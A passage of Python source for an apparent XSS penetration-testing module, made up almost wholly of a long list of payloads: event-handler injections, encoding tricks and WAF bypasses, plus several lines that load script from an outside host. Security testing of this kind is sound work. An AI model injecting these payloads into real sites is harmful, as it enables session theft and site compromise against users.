"""
XSS Penetration Testing Module - Simplified Version
"""

import re
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass
from playwright.sync_api import Page, Locator


@dataclass
class XSSPayload:
    name: str
    payload: str
    risk_level: str


@dataclass
class XSSResult:
    input_name: str
    payload: str
    is_vulnerable: bool
    response_snippet: str
    risk_level: str
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert XSSResult to dictionary for JSON serialization"""
        return {
            'input_name': self.input_name,
            'payload': self.payload,
            'is_vulnerable': self.is_vulnerable,
            'response_snippet': self.response_snippet,
            'risk_level': self.risk_level
        }


class XSSPentester:
    """XSS Penetration Tester - Simplified"""
    
    def __init__(self):
        self.payloads = [
            # Basic XSS Payloads
            XSSPayload("Basic Script", "<script>alert('XSS')</script>", "high"),
            XSSPayload("Basic Script Encoded", "&lt;script&gt;alert('XSS')&lt;/script&gt;", "high"),
            XSSPayload("Script with String", "<script>alert(String.fromCharCode(88,83,83))</script>", "high"),
            
            # Image-based XSS
            XSSPayload("Image onerror", "<img src=x onerror=alert('XSS')>", "high"),
            XSSPayload("Image onload", "<img src=x onload=alert('XSS')>", "high"),
            XSSPayload("Image src javascript", "<img src=\"javascript:alert('XSS')\">", "high"),
            XSSPayload("Image broken src", "<img src=\"\" onerror=alert('XSS')>", "high"),
            
            # SVG-based XSS
            XSSPayload("SVG onload", "<svg onload=alert('XSS')>", "high"),
            XSSPayload("SVG script", "<svg><script>alert('XSS')</script></svg>", "high"),
            XSSPayload("SVG foreignObject", "<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>", "high"),
            
            # Input-based XSS
            XSSPayload("Input onfocus", "<input onfocus=alert('XSS') autofocus>", "medium"),
            XSSPayload("Input onblur", "<input onblur=alert('XSS') autofocus><input autofocus>", "medium"),
            XSSPayload("Input onclick", "<input onclick=alert('XSS')>", "medium"),
            
            # Link-based XSS
            XSSPayload("Link javascript", "<a href=javascript:alert('XSS')>Click</a>", "medium"),
            XSSPayload("Link onclick", "<a onclick=alert('XSS')>Click</a>", "medium"),
            XSSPayload("Link onmouseover", "<a onmouseover=alert('XSS')>Hover</a>", "medium"),
            
            # Event Handler XSS
            XSSPayload("Body onload", "<body onload=alert('XSS')>", "high"),
            XSSPayload("Div onclick", "<div onclick=alert('XSS')>Click</div>", "medium"),
            XSSPayload("Iframe onload", "<iframe onload=alert('XSS')>", "high"),
            
            # Filter Bypass Techniques
            XSSPayload("Case Variation", "<ScRiPt>alert('XSS')</ScRiPt>", "high"),
            XSSPayload("Mixed Case", "<ScRiPt>alert('XSS')</ScRiPt>", "high"),
            XSSPayload("No Quotes", "<script>alert(String.fromCharCode(88,83,83))</script>", "high"),
            XSSPayload("Double Quotes", "<script>alert(\"XSS\")</script>", "high"),
            XSSPayload("Single Quotes", "<script>alert('XSS')</script>", "high"),
            
            # Encoding Techniques
            XSSPayload("HTML Entity", "&#60;script&#62;alert('XSS')&#60;/script&#62;", "high"),
            XSSPayload("URL Encoding", "%3Cscript%3Ealert('XSS')%3C/script%3E", "high"),
            XSSPayload("Unicode", "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e", "high"),
            
            # Advanced Techniques
            XSSPayload("Expression", "<div style=\"background:url('javascript:alert(\\'XSS\\')')\">", "high"),
            XSSPayload("CSS Expression", "<div style=\"expression(alert('XSS'))\">", "high"),
            XSSPayload("VBScript", "<script language=\"vbscript\">alert(\"XSS\")</script>", "high"),
            
            # DOM-based XSS
            XSSPayload("DOM Script", "<script>document.write('<img src=x onerror=alert(\\'XSS\\')>')</script>", "high"),
            XSSPayload("DOM CreateElement", "<script>var img=document.createElement('img');img.src='x';img.onerror=alert('XSS');</script>", "high"),
            
            # WAF Bypass Techniques
            XSSPayload("WAF Bypass 1", "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>", "high"),
            XSSPayload("WAF Bypass 2", "<script>window['alert']('XSS')</script>", "high"),
            XSSPayload("WAF Bypass 3", "<script>setTimeout('alert(\\'XSS\\')',0)</script>", "high"),
            XSSPayload("WAF Bypass 4", "<script>Function('alert(\\'XSS\\')')()</script>", "high"),
            
            # Polyglot XSS
            XSSPayload("Polyglot", "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>", "critical"),
            
            # Template Injection
            XSSPayload("Template Injection", "{{7*7}}", "medium"),
            XSSPayload("Template Injection 2", "${7*7}", "medium"),
            XSSPayload("Template Injection 3", "#{7*7}", "medium"),
            
            # File Upload XSS
            XSSPayload("File Upload SVG", "<svg onload=alert('XSS')>", "high"),
            XSSPayload("File Upload HTML", "<html><body><script>alert('XSS')</script></body></html>", "high"),
            
            # Protocol-based XSS
            XSSPayload("Data URI", "<img src=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>\">", "high"),
            XSSPayload("JavaScript URI", "<iframe src=\"javascript:alert('XSS')\">", "high"),
            
            # Advanced XSS Payloads - Comprehensive Collection
            XSSPayload("Prompt Basic 1", "-prompt(8)-", "high"),
            XSSPayload("Prompt Basic 2", "'-prompt(8)-'", "high"),
            XSSPayload("Prompt Function 1", "\";a=prompt,a()//", "high"),
            XSSPayload("Prompt Function 2", "';a=prompt,a()//", "high"),
            XSSPayload("Prompt Eval 1", "'-eval(\"window['pro'%2B'mpt'](8)\")-'", "high"),
            XSSPayload("Prompt Eval 2", "\"-eval(\"window['pro'%2B'mpt'](8)\")-\"", "high"),
            XSSPayload("Onclick Prompt 1", "\"onclick=prompt(8)>\"@x.y", "high"),
            XSSPayload("Onclick Prompt 2", "\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y", "high"),
            XSSPayload("Image Error 1", "<image/src/onerror=prompt(8)>", "high"),
            XSSPayload("Image Error 2", "<img/src/onerror=prompt(8)>", "high"),
            XSSPayload("Image Error 3", "<image src=onerror=prompt(8)>", "high"),
            XSSPayload("Image Error 4", "<img src=onerror=prompt(8)>", "high"),
            XSSPayload("Image Error 5", "<image src =q onerror=prompt(8)>", "high"),
            XSSPayload("Image Error 6", "<img src =q onerror=prompt(8)>", "high"),
            XSSPayload("Script Break", "</scrip</script>t><img src =q onerror=prompt(8)>", "high"),
            XSSPayload("SVG Alert", "<svg onload=alert(1)>", "high"),
            XSSPayload("SVG Alert Break", "\"><svg onload=alert(1)//", "high"),
            XSSPayload("Mouseover Alert", "\"onmouseover=alert(1)//", "high"),
            XSSPayload("Autofocus Alert", "\"autofocus/onfocus=alert(1)//", "high"),
            XSSPayload("Alert Basic 1", "'-alert(1)-'", "high"),
            XSSPayload("Alert Basic 2", "'-alert(1)//", "high"),
            XSSPayload("Alert Escape", "\\'-alert(1)//", "high"),
            XSSPayload("Script SVG", "</script><svg onload=alert(1)>", "high"),
            XSSPayload("Contenteditable Blur", "<x contenteditable onblur=alert(1)>lose focus!", "high"),
            XSSPayload("Contenteditable Click", "<x onclick=alert(1)>click this!", "high"),
            XSSPayload("Contenteditable Copy", "<x oncopy=alert(1)>copy this!", "high"),
            XSSPayload("Contenteditable Context", "<x oncontextmenu=alert(1)>right click this!", "high"),
            XSSPayload("Contenteditable Cut", "<x oncut=alert(1)>copy this!", "high"),
            XSSPayload("Contenteditable DblClick", "<x ondblclick=alert(1)>double click this!", "high"),
            XSSPayload("Contenteditable Drag", "<x ondrag=alert(1)>drag this!", "high"),
            XSSPayload("Contenteditable Focus", "<x contenteditable onfocus=alert(1)>focus this!", "high"),
            XSSPayload("Contenteditable Input", "<x contenteditable oninput=alert(1)>input here!", "high"),
            XSSPayload("Contenteditable Keydown", "<x contenteditable onkeydown=alert(1)>press any key!", "high"),
            XSSPayload("Contenteditable Keypress", "<x contenteditable onkeypress=alert(1)>press any key!", "high"),
            XSSPayload("Contenteditable Keyup", "<x contenteditable onkeyup=alert(1)>press any key!", "high"),
            XSSPayload("Contenteditable Mousedown", "<x onmousedown=alert(1)>click this!", "high"),
            XSSPayload("Contenteditable Mousemove", "<x onmousemove=alert(1)>hover this!", "high"),
            XSSPayload("Contenteditable Mouseout", "<x onmouseout=alert(1)>hover this!", "high"),
            XSSPayload("Contenteditable Mouseover", "<x onmouseover=alert(1)>hover this!", "high"),
            XSSPayload("Contenteditable Mouseup", "<x onmouseup=alert(1)>click this!", "high"),
            XSSPayload("Contenteditable Paste", "<x contenteditable onpaste=alert(1)>paste here!", "high"),
            XSSPayload("Script Alert 1", "<script>alert(1)//", "high"),
            XSSPayload("Script Alert 2", "<script>alert(1)<!â€“", "high"),
            XSSPayload("Script External 1", "<script src=//brutelogic.com.br/1.js>", "high"),
            XSSPayload("Script External 2", "<script src=//3334957647/1>", "high"),
            XSSPayload("XSS Encoded 1", "%3Cx onxxx=alert(1)", "high"),
            XSSPayload("XSS Encoded 2", "<%78 onxxx=1", "high"),
            XSSPayload("XSS Encoded 3", "<x %6Fnxxx=1", "high"),
            XSSPayload("XSS Encoded 4", "<x o%6Exxx=1", "high"),
            XSSPayload("XSS Encoded 5", "<x on%78xx=1", "high"),
            XSSPayload("XSS Encoded 6", "<x onxxx%3D1", "high"),
            XSSPayload("XSS Case 1", "<X onxxx=1", "high"),
            XSSPayload("XSS Case 2", "<x OnXxx=1", "high"),
            XSSPayload("XSS Case 3", "<X OnXxx=1", "high"),
            XSSPayload("XSS Double", "<x onxxx=1 onxxx=1", "high"),
            XSSPayload("XSS Slash", "<x/onxxx=1", "high"),
            XSSPayload("XSS Tab", "<x%09onxxx=1", "high"),
            XSSPayload("XSS Newline", "<x%0Aonxxx=1", "high"),
            XSSPayload("XSS Formfeed", "<x%0Conxxx=1", "high"),
            XSSPayload("XSS Carriage", "<x%0Donxxx=1", "high"),
            XSSPayload("XSS Forward", "<x%2Fonxxx=1", "high"),
            XSSPayload("XSS Quote 1", "<x 1='1'onxxx=1", "high"),
            XSSPayload("XSS Quote 2", "<x 1=\"1\"onxxx=1", "high"),
            XSSPayload("XSS Close", "<x </onxxx=1", "high"),
            XSSPayload("XSS Greater", "<x 1=\">\" onxxx=1", "high"),
            XSSPayload("XSS HTTP", "<http://onxxx%3D1/", "high"),
            XSSPayload("XSS Quote Alert", "<x onxxx=alert(1) 1='", "high"),
            XSSPayload("SVG Load", "'onload=alert(1)><svg/1='", "high"),
            XSSPayload("Script Break 1", "'>alert(1)</script><script/1='", "high"),
            XSSPayload("Script Break 2", "*/alert(1)</script><script>/*", "high"),
            XSSPayload("Script Break 3", "*/alert(1)\">'onload=\"/*<svg/1='", "high"),
            XSSPayload("Script Break 4", "`-alert(1)\">'onload=\"`<svg/1='", "high"),
            XSSPayload("Script Break 5", "*/</script>'>alert(1)/*<script/1='", "high"),
            XSSPayload("Script Basic", "<script>alert(1)</script>", "high"),
            XSSPayload("Script JS", "<script src=javascript:alert(1)>", "high"),
            XSSPayload("Iframe JS", "<iframe src=javascript:alert(1)>", "high"),
            XSSPayload("Embed JS", "<embed src=javascript:alert(1)>", "high"),
            XSSPayload("Link JS", "<a href=javascript:alert(1)>click", "high"),
            XSSPayload("Math JS", "<math><brute href=javascript:alert(1)>click", "high"),
            XSSPayload("Form JS", "<form action=javascript:alert(1)><input type=submit>", "high"),
            XSSPayload("Isindex JS", "<isindex action=javascript:alert(1) type=submit value=click>", "high"),
            XSSPayload("Form Action", "<form><button formaction=javascript:alert(1)>click", "high"),
            XSSPayload("Form Input Submit", "<form><input formaction=javascript:alert(1) type=submit value=click>", "high"),
            XSSPayload("Form Input Image", "<form><input formaction=javascript:alert(1) type=image value=click>", "high"),
            XSSPayload("Form Input Image Src", "<form><input formaction=javascript:alert(1) type=image src=SOURCE>", "high"),
            XSSPayload("Isindex Form", "<isindex formaction=javascript:alert(1) type=submit value=click>", "high"),
            XSSPayload("Object JS", "<object data=javascript:alert(1)>", "high"),
            XSSPayload("Iframe Srcdoc", "<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>", "high"),
            XSSPayload("SVG Xlink", "<svg><script xlink:href=data:,alert(1) />", "high"),
            XSSPayload("Math Xlink", "<math><brute xlink:href=javascript:alert(1)>click", "high"),
            XSSPayload("SVG Complex", "<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>", "high"),
            XSSPayload("HTML Touch Start", "<html ontouchstart=alert(1)>", "high"),
            XSSPayload("HTML Touch End", "<html ontouchend=alert(1)>", "high"),
            XSSPayload("HTML Touch Move", "<html ontouchmove=alert(1)>", "high"),
            XSSPayload("HTML Touch Cancel", "<html ontouchcancel=alert(1)>", "high"),
            XSSPayload("Body Orientation", "<body onorientationchange=alert(1)>", "high"),
            XSSPayload("Image Error GIF", "\"><img src=1 onerror=alert(1)>.gif", "high"),
            XSSPayload("SVG Namespace", "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>", "high"),
            XSSPayload("GIF SVG", "GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;", "high"),
            XSSPayload("Script Data 1", "<script src=\"data:&comma;alert(1)//", "high"),
            XSSPayload("Script Data 2", "\"><script src=data:&comma;alert(1)//", "high"),
            XSSPayload("Script External 3", "<script src=\"//brutelogic.com.br&sol;1.js&num;", "high"),
            XSSPayload("Script External 4", "\"><script src=//brutelogic.com.br&sol;1.js&num;", "high"),
            XSSPayload("Link Import 1", "<link rel=import href=\"data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;", "high"),
            XSSPayload("Link Import 2", "\"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;", "high"),
            XSSPayload("Base Href", "<base href=//0>", "high"),
            XSSPayload("Script Data Eval", "<script/src=\"data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)", "high"),
            XSSPayload("Body Load", "<body onload=alert(1)>", "high"),
            XSSPayload("Body Page Show", "<body onpageshow=alert(1)>", "high"),
            XSSPayload("Body Focus", "<body onfocus=alert(1)>", "high"),
            XSSPayload("Body Hash Change", "<body onhashchange=alert(1)><a href=#x>click this!#x", "high"),
            XSSPayload("Body Scroll", "<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x", "high"),
            XSSPayload("Body Scroll Long", "<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><x id=x>#x", "high"),
            XSSPayload("Body Resize", "<body onresize=alert(1)>press F12!", "high"),
            XSSPayload("Body Help", "<body onhelp=alert(1)>press F1! (MSIE)", "high"),
            XSSPayload("Marquee Start", "<marquee onstart=alert(1)>", "high"),
            XSSPayload("Marquee Finish", "<marquee loop=1 width=0 onfinish=alert(1)>", "high"),
            XSSPayload("Audio Load Start", "<audio src onloadstart=alert(1)>", "high"),
            XSSPayload("Video Load Start", "<video onloadstart=alert(1)><source>", "high"),
            XSSPayload("Input Autofocus Blur", "<input autofocus onblur=alert(1)>", "high"),
            XSSPayload("Keygen Autofocus", "<keygen autofocus onfocus=alert(1)>", "high"),
            XSSPayload("Form Submit", "<form onsubmit=alert(1)><input type=submit>", "high"),
            XSSPayload("Select Change", "<select onchange=alert(1)><option>1<option>2", "high"),
            XSSPayload("Menu Context", "<menu id=x contextmenu=x onshow=alert(1)>right click me!", "high"),
            XSSPayload("Alert Template", "alert`1`", "high"),
            XSSPayload("Alert HTML Entity", "alert&lpar;1&rpar;", "high"),
            XSSPayload("Alert Hex Entity", "alert&#x28;1&#x29", "high"),
            XSSPayload("Alert Decimal Entity", "alert&#40;1&#41", "high"),
            XSSPayload("Alert Parentheses", "(alert)(1)", "high"),
            XSSPayload("Alert Assignment", "a=alert,a(1)", "high"),
            XSSPayload("Alert Find", "[1].find(alert)", "high"),
            XSSPayload("Alert Top String", "top[\"al\"+\"ert\"](1)", "high"),
            XSSPayload("Alert Top Regex", "top[/al/.source+/ert/.source](1)", "high"),
            XSSPayload("Alert Unicode", "al\\u0065rt(1)", "high"),
            XSSPayload("Alert Octal", "top['al\\145rt'](1)", "high"),
            XSSPayload("Alert Hex", "top['al\\x65rt'](1)", "high"),
            XSSPayload("Alert ToString", "top[8680439..toString(30)](1)", "high"),
            XSSPayload("Navigator Vibrate", "navigator.vibrate(500)", "high"),
            XSSPayload("Eval URL", "eval(URL.slice(-8))>#alert(1)", "high"),
            XSSPayload("Eval Location", "eval(location.hash.slice(1)>#alert(1)", "high"),
            XSSPayload("InnerHTML Hash", "innerHTML=location.hash>#<script>alert(1)</script>", "high"),
            XSSPayload("Draggable Drag", "<a draggable=\"true\" ondrag=\"alert(1)\">test</a>", "high"),
            XSSPayload("Draggable Drag End", "<a draggable=\"true\" ondragend=\"alert(1)\">test</a>", "high"),
            XSSPayload("Draggable Drag Enter", "<a draggable=\"true\" ondragenter=\"alert(1)\">test</a>", "high"),
            XSSPayload("Draggable Drag Leave", "<a draggable=\"true\" ondragleave=\"alert(1)\">test</a>", "high"),
            XSSPayload("Draggable Drag Start", "<a draggable=\"true\" ondragstart=\"alert(1)\">test</a>", "high"),
            XSSPayload("Tabindex Activate", "<a id=x tabindex=1 onactivate=alert(1)></a>", "high"),
            XSSPayload("Tabindex Before Activate", "<a id=x tabindex=1 onbeforeactivate=alert(1)></a>", "high"),
            XSSPayload("Tabindex Before Deactivate", "<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>", "high"),
            XSSPayload("Tabindex Deactivate", "<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>", "high"),
            XSSPayload("Tabindex Focus", "<a id=x tabindex=1 onfocus=alert(1)></a>", "high"),
            XSSPayload("Tabindex Focus In", "<a id=x tabindex=1 onfocusin=alert(1)></a>", "high"),
            XSSPayload("Before Copy", "<a onbeforecopy=\"alert(1)\" contenteditable>test</a>", "high"),
            XSSPayload("Before Cut", "<a onbeforecut=\"alert(1)\" contenteditable>test</a>", "high"),
            XSSPayload("Before Paste", "<a onbeforepaste=\"alert(1)\" contenteditable>test</a>", "high"),
            XSSPayload("Blur Tabindex", "<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>", "high"),
            XSSPayload("Click Basic", "<a onclick=\"alert(1)\">test</a>", "high"),
            XSSPayload("Context Menu", "<a oncontextmenu=\"alert(1)\">test</a>", "high"),
            XSSPayload("Copy", "<a oncopy=\"alert(1)\" contenteditable>test</a>", "high"),
            XSSPayload("Cut", "<a oncut=\"alert(1)\" contenteditable>test</a>", "high"),
            XSSPayload("Double Click", "<a ondblclick=\"alert(1)\">test</a>", "high"),
            XSSPayload("Focus Out", "<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>", "high"),
            XSSPayload("Key Down", "<a onkeydown=\"alert(1)\" contenteditable>test</a>", "high"),
            XSSPayload("Key Press", "<a onkeypress=\"alert(1)\" contenteditable>test</a>", "high"),
            XSSPayload("Key Up", "<a onkeyup=\"alert(1)\" contenteditable>test</a>", "high"),
            XSSPayload("Mouse Down", "<a onmousedown=\"alert(1)\">test</a>", "high"),
            XSSPayload("Mouse Enter", "<a onmouseenter=\"alert(1)\">test</a>", "high"),
            XSSPayload("Mouse Leave", "<a onmouseleave=\"alert(1)\">test</a>", "high"),
            XSSPayload("Mouse Move", "<a onmousemove=\"alert(1)\">test</a>", "high"),
            XSSPayload("Mouse Out", "<a onmouseout=\"alert(1)\">test</a>", "high"),
            XSSPayload("Mouse Over", "<a onmouseover=\"alert(1)\">test</a>", "high"),
            XSSPayload("Mouse Up", "<a onmouseup=\"alert(1)\">test</a>", "high"),
            XSSPayload("Paste", "<a onpaste=\"alert(1)\" contenteditable>test</a>", "high"),
            XSSPayload("Audio Pause", "<audio autoplay controls onpause=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>", "high"),
            XSSPayload("Audio Seeked", "<audio autoplay controls onseeked=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>", "high"),
            XSSPayload("Audio Seeking", "<audio autoplay controls onseeking=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>", "high"),
            XSSPayload("Audio Volume Change", "<audio autoplay controls onvolumechange=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>", "high"),
            XSSPayload("Audio Loaded Metadata", "<audio autoplay onloadedmetadata=alert(1)> <source src=\"validaudio.wav\" type=\"audio/wav\"></audio>", "high"),
            XSSPayload("Audio Play", "<audio autoplay onplay=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>", "high"),
            XSSPayload("Audio Playing", "<audio autoplay onplaying=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>", "high"),
            XSSPayload("Audio Ended", "<audio controls autoplay onended=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>", "high"),
            XSSPayload("Audio Time Update", "<audio controls autoplay ontimeupdate=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>", "high"),
            XSSPayload("Audio Can Play", "<audio oncanplay=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>", "high"),
            XSSPayload("Audio Loaded Data", "<audio onloadeddata=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>", "high"),
            XSSPayload("Audio Focus", "<audio id=x controls onfocus=alert(1) id=x><source src=\"validaudio.wav\"></audio>", "high"),
            XSSPayload("Audio Focus In", "<audio id=x controls onfocusin=alert(1) id=x><source src=\"validaudio.wav\"></audio>", "high"),
            XSSPayload("Audio Src Error", "<audio src/onerror=alert(1)>", "high"),
            
            # Additional HTML Element XSS Payloads - Comprehensive Collection
            XSSPayload("Base Mouse Down", "<base onmousedown=\"alert(1)\">test</base>", "high"),
            XSSPayload("Base Mouse Enter", "<base onmouseenter=\"alert(1)\">test</base>", "high"),
            XSSPayload("Base Mouse Leave", "<base onmouseleave=\"alert(1)\">test</base>", "high"),
            XSSPayload("Base Mouse Move", "<base onmousemove=\"alert(1)\">test</base>", "high"),
            XSSPayload("Base Mouse Out", "<base onmouseout=\"alert(1)\">test</base>", "high"),
            XSSPayload("Base Mouse Over", "<base onmouseover=\"alert(1)\">test</base>", "high"),
            XSSPayload("Base Mouse Up", "<base onmouseup=\"alert(1)\">test</base>", "high"),
            XSSPayload("Base Paste", "<base onpaste=\"alert(1)\" contenteditable>test</base>", "high"),
            
            # Basefont XSS Payloads
            XSSPayload("Basefont Drag", "<basefont draggable=\"true\" ondrag=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Drag End", "<basefont draggable=\"true\" ondragend=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Drag Enter", "<basefont draggable=\"true\" ondragenter=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Drag Leave", "<basefont draggable=\"true\" ondragleave=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Drag Start", "<basefont draggable=\"true\" ondragstart=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Activate", "<basefont id=x tabindex=1 onactivate=alert(1)></basefont>", "high"),
            XSSPayload("Basefont Before Activate", "<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>", "high"),
            XSSPayload("Basefont Before Deactivate", "<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>", "high"),
            XSSPayload("Basefont Deactivate", "<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>", "high"),
            XSSPayload("Basefont Focus", "<basefont id=x tabindex=1 onfocus=alert(1)></basefont>", "high"),
            XSSPayload("Basefont Focus In", "<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>", "high"),
            XSSPayload("Basefont Before Copy", "<basefont onbeforecopy=\"alert(1)\" contenteditable>test</basefont>", "high"),
            XSSPayload("Basefont Before Cut", "<basefont onbeforecut=\"alert(1)\" contenteditable>test</basefont>", "high"),
            XSSPayload("Basefont Before Paste", "<basefont onbeforepaste=\"alert(1)\" contenteditable>test</basefont>", "high"),
            XSSPayload("Basefont Blur", "<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>", "high"),
            XSSPayload("Basefont Click", "<basefont onclick=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Context Menu", "<basefont oncontextmenu=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Copy", "<basefont oncopy=\"alert(1)\" contenteditable>test</basefont>", "high"),
            XSSPayload("Basefont Cut", "<basefont oncut=\"alert(1)\" contenteditable>test</basefont>", "high"),
            XSSPayload("Basefont Double Click", "<basefont ondblclick=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Focus Out", "<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>", "high"),
            XSSPayload("Basefont Key Down", "<basefont onkeydown=\"alert(1)\" contenteditable>test</basefont>", "high"),
            XSSPayload("Basefont Key Press", "<basefont onkeypress=\"alert(1)\" contenteditable>test</basefont>", "high"),
            XSSPayload("Basefont Key Up", "<basefont onkeyup=\"alert(1)\" contenteditable>test</basefont>", "high"),
            XSSPayload("Basefont Mouse Down", "<basefont onmousedown=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Mouse Enter", "<basefont onmouseenter=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Mouse Leave", "<basefont onmouseleave=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Mouse Move", "<basefont onmousemove=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Mouse Out", "<basefont onmouseout=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Mouse Over", "<basefont onmouseover=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Mouse Up", "<basefont onmouseup=\"alert(1)\">test</basefont>", "high"),
            XSSPayload("Basefont Paste", "<basefont onpaste=\"alert(1)\" contenteditable>test</basefont>", "high"),
            
            # BDI XSS Payloads
            XSSPayload("BDI Drag", "<bdi draggable=\"true\" ondrag=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Drag End", "<bdi draggable=\"true\" ondragend=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Drag Enter", "<bdi draggable=\"true\" ondragenter=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Drag Leave", "<bdi draggable=\"true\" ondragleave=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Drag Start", "<bdi draggable=\"true\" ondragstart=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Activate", "<bdi id=x tabindex=1 onactivate=alert(1)></bdi>", "high"),
            XSSPayload("BDI Before Activate", "<bdi id=x tabindex=1 onbeforeactivate=alert(1)></bdi>", "high"),
            XSSPayload("BDI Before Deactivate", "<bdi id=x tabindex=1 onbeforedeactivate=alert(1)></bdi><input autofocus>", "high"),
            XSSPayload("BDI Deactivate", "<bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>", "high"),
            XSSPayload("BDI Focus", "<bdi id=x tabindex=1 onfocus=alert(1)></bdi>", "high"),
            XSSPayload("BDI Focus In", "<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>", "high"),
            XSSPayload("BDI Before Copy", "<bdi onbeforecopy=\"alert(1)\" contenteditable>test</bdi>", "high"),
            XSSPayload("BDI Before Cut", "<bdi onbeforecut=\"alert(1)\" contenteditable>test</bdi>", "high"),
            XSSPayload("BDI Before Paste", "<bdi onbeforepaste=\"alert(1)\" contenteditable>test</bdi>", "high"),
            XSSPayload("BDI Blur", "<bdi onblur=alert(1) tabindex=1 id=x></bdi><input autofocus>", "high"),
            XSSPayload("BDI Click", "<bdi onclick=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Context Menu", "<bdi oncontextmenu=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Copy", "<bdi oncopy=\"alert(1)\" contenteditable>test</bdi>", "high"),
            XSSPayload("BDI Cut", "<bdi oncut=\"alert(1)\" contenteditable>test</bdi>", "high"),
            XSSPayload("BDI Double Click", "<bdi ondblclick=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Focus Out", "<bdi onfocusout=alert(1) tabindex=1 id=x></bdi><input autofocus>", "high"),
            XSSPayload("BDI Key Down", "<bdi onkeydown=\"alert(1)\" contenteditable>test</bdi>", "high"),
            XSSPayload("BDI Key Press", "<bdi onkeypress=\"alert(1)\" contenteditable>test</bdi>", "high"),
            XSSPayload("BDI Key Up", "<bdi onkeyup=\"alert(1)\" contenteditable>test</bdi>", "high"),
            XSSPayload("BDI Mouse Down", "<bdi onmousedown=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Mouse Enter", "<bdi onmouseenter=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Mouse Leave", "<bdi onmouseleave=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Mouse Move", "<bdi onmousemove=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Mouse Out", "<bdi onmouseout=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Mouse Over", "<bdi onmouseover=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Mouse Up", "<bdi onmouseup=\"alert(1)\">test</bdi>", "high"),
            XSSPayload("BDI Paste", "<bdi onpaste=\"alert(1)\" contenteditable>test</bdi>", "high"),
            
            # BDO XSS Payloads
            XSSPayload("BDO Drag", "<bdo draggable=\"true\" ondrag=\"alert(1)\">test</bdo>", "high"),
            XSSPayload("BDO Drag End", "<bdo draggable=\"true\" ondragend=\"alert(1)\">test</bdo>", "high"),
            XSSPayload("BDO Drag Enter", "<bdo draggable=\"true\" ondragenter=\"alert(1)\">test</bdo>", "high"),
